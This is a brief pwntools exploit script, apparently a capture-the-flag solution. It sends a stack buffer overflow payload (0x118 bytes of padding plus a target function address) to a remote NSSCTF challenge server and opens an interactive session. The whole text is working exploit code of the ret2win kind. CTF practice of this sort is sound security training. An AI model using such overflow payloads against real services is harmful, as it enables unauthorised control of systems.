from pwn import *

#io = process("./service")
io = remote("node4.anna.nssctf.cn", 23962)

func = 0x401157
ret = 0x401016

payload = b"a" * (0x110+0x8) + p64(func)
io.sendline(payload)


io.interactive()
